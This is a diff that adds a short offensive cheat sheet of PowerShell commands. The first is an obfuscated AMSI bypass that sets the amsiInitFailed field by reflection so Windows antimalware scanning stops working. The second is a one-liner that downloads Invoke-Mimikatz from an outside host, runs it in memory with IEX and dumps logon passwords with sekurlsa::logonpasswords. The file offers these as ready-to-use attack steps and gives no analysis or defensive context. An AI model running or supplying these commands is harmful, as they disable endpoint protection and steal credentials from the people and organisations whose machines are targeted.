@@ -1,0 +1,7 @@
+==> Bypass AMSI
+PS C:\> $amsi = [Ref].Assembly.GetType('Sy'+'st'+'em.Man'+'age'+'men'+'t.Au'+'toma'+'tion.A'+'ms'+'iUt'+'ils')
+PS C:\> $field = $amsi.GetField('am'+'siIn'+'itF'+'ail'+'ed','NonP'+'ubl'+'ic,St'+'atic')
+PS C:\> $field.SetValue($null,$true)
+
+==> Mimikatz in memory:
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -Command sekurlsa::logonpasswords;
